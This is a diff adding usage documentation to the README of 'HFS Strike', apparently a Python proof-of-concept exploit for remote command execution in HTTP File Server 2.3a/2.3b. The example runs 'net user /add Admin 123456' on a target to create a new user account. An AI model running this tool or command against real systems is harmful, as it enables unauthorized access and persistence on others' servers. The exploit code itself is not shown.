@@ -9,3 +9,22 @@ HFS Strike is a simple Python Proof of Concept (PoC) and command line exploit to
 - 2.3a
 - 2.3b
 
+## Usage
+General usage:
+```
+python hfs_strike.py [options]
+```
+
+Options:
+| Argument | Description |
+| --- | --- |
+| -t | Target url |
+| -c | System (cmd) command string to execute |
+
+Example:
+```bat
+python hfs_strike.py -t http://192.168.1.185/ -c "net user /add Admin 123456"
+```
+
+## Roadmap
+This tool _could_ evolve to include features of exploiting more HFS RCEs, but this is not certainly planned in future.
